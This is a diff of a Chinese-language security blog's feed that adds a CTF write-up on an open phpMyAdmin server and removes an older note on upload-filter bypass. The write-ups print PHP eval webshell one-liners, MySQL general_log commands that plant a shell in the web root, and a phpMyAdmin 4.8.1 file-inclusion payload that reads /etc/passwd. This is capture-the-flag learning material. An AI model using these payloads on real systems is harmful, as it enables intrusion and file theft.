@@ -369,6 +369,28 @@
   </entry>
   
   <entry>
+    <title>[GWCTF 2019]我有一个数据库</title>
+    <link href="http://yoursite.com/2020/04/14/[GWCTF%202019]%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    <id>http://yoursite.com/2020/04/14/[GWCTF%202019]%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
+    <published>2020-04-14T04:46:02.813Z</published>
+    <updated>2020-06-23T06:30:12.902Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>打开网页，查看网页源码，发现什么都没有。进行目录扫描，发现了：phpmyadmin ，phpinfo.php。</p><p>打开phpmyadmin，直接登录了不需要密码，猜测应该是提权。</p><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>说道写shell不得不说 MYSQL secure_file_priv对读写文件的影响。首先我们先查看这个参数的值</p><pre><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code></pre><p>返回参数为NULL。</p><pre><code>secure_file_priv的值为null ，表示限制mysql不允许导入|导出当secure_file_priv的值为/tmp/ ，表示限制mysql的导入|导出只能发生在/tmp/目录下当secure_file_priv的值没有具体值时，表示不对mysql的导入|导出做限制</code></pre><p>这个时候就可以利用(general_log、general_log file)日志文件getshell，general_log就是记录输入的日志文件，general_log file就是规定日志保存在哪个路径，我们只要输入一句话然后保存网站目录下的php文件就OK了。</p><pre><code>SHOW VARIABLES LIKE &#39;general%&#39;;</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200414121504433.png" alt="image-20200414121504433"></p><p>设置general_log为on，并且把日志存放路径设置为网站根目录。</p><pre><code>set global general_log = &quot;ON&quot;;SET global general_log_file=&#39;/var/www/html/shell.php&#39;;</code></pre><p>因为网站泄露了phpinfo泄露了绝对路径</p><p>这时候我们查询</p><pre><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code></pre><p>然后这种不可以。因为我们没有权限在网站目录下创建日志文件。因为此台服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限。所以也无法写shell并解析。</p><h2 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h2><p>可以知道：phpMyAdmin</p><ul><li>​            版本信息： 4.8.1        </li></ul><p>直接Google发现了4.8.0~4.8.1存在文件包含漏洞。        </p><pre><code>payload:target=db_sql.php%253f/../../../../../../etc/passwd</code></pre><pre><code>?target=db_sql.php%253f/../../../../../../flag</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200414124523159.png" alt="image-20200414124523159"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;GWCTF-2019-我有一个数据库&quot;&gt;&lt;a href=&quot;#GWCTF-2019-我有一个数据库&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]我有一个数据库&quot;&gt;&lt;/a&gt;[GWCTF 2019]我有一个数据库&lt;/h2&gt;&lt;p&gt;打开网页
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>python反序列化漏洞浅析</title>
     <link href="http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
     <id>http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
@@ -426,28 +448,6 @@
       
       
         &lt;p&gt;这一题有两个地方卡住我了，第一个是没有想到备份名叫&lt;a href=&quot;http://www.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip&lt;/a&gt;.&lt;br&gt;第二个是public、protected与private在序列化时的区别。&lt;br
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>上传绕过  .user.ini</title>
-    <link href="http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/"/>
-    <id>http://yoursite.com/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/</id>
-    <published>2020-03-28T12:23:26.000Z</published>
-    <updated>2020-03-28T12:27:01.738Z</updated>
-    
-    <content type="html"><![CDATA[<p>今天做了一题是BUUCTF上的checkin<br>一道文件上传题，题目首先对文件内容进行了过滤，过滤了<?因此<?php  ?>就不行了因此应该用<script language="php">eval($_POST['a']);</script>。同时这道题对文件名也过滤的死死的于是想用.htaccess但是发现没有用，后来知道该文件需要apache而这里是nginx。则需要.user.ini</p><blockquote><p>auto_prepend_file=X.jpg</p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;今天做了一题是BUUCTF上的checkin&lt;br&gt;一道文件上传题，题目首先对文件内容进行了过滤，过滤了&lt;?因此&lt;?php  ?&gt;就不行了因此应该用&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;。同时这道题对文件名也过滤
       
     
     </summary>
